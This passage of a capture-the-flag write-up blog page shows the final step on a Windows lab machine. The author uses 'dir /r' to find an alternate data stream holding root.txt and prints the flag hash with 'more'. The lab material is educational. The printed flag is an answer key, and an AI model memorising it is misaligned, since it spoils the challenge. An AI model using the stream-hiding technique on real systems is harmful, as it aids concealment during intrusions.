+If we look for the <strong>root.txt</strong> in its usual path it&rsquo;s not there:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is BE50-B1C9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>12/24/2017  03:51 AM                <span style="color:#ae81ff">36</span> hm.txt
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM               <span style="color:#ae81ff">797</span> Windows <span style="color:#ae81ff">10</span> Update Assistant.lnk
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>            <span style="color:#ae81ff">833</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,246,123,008 bytes free
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>C:sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; type hm.txt
+</span></span><span style="display:flex;"><span>The flag is elsewhere.  Look deeper.
+</span></span></code></pre></div><p>Or is it?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; dir /r
+</span></span><span style="display:flex;"><span> Volume in drive C has no label.
+</span></span><span style="display:flex;"><span> Volume Serial Number is BE50-B1C9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> Directory of C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM    &lt;DIR&gt;          .
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM    &lt;DIR&gt;          ..
+</span></span><span style="display:flex;"><span>12/24/2017  03:51 AM                <span style="color:#ae81ff">36</span> hm.txt
+</span></span><span style="display:flex;"><span>                                    <span style="color:#ae81ff">34</span> hm.txt:root.txt:$DATA
+</span></span><span style="display:flex;"><span>11/08/2017  10:05 AM               <span style="color:#ae81ff">797</span> Windows <span style="color:#ae81ff">10</span> Update Assistant.lnk
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>            <span style="color:#ae81ff">833</span> bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>     Total Files Listed:
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> File<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>            <span style="color:#ae81ff">833</span> bytes
+</span></span><span style="display:flex;"><span>               <span style="color:#ae81ff">2</span> Dir<span style="color:#f92672">(</span>s<span style="color:#f92672">)</span>   7,246,094,336 bytes free
+</span></span></code></pre></div><p>With the parameter <strong>/r</strong> we find the alternate data streams, where the <strong>root.txt</strong> is.</p>
+<p>Using <strong>more</strong> we can get its content:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\A</span>dministrator<span style="color:#ae81ff">\D</span>esktop&gt; more &lt; hm.txt:root.txt
+</span></span><span style="display:flex;"><span>afbc5bd4b615a60648cec41c6ac92530
+</span></span></code></pre></div><p>That&rsquo;s it for this machine. See you next time!</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://theloganlab.github.io/posts/epsilon/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Epsilon - Write up</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://theloganlab.github.io/posts/horizontall/">
+                <span class="button__text">Horizontall - Write up</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+      </div>
+  </div>
+</footer>
+
+<script src="https://theloganlab.github.io/assets/main.js"></script>
+<script src="https://theloganlab.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
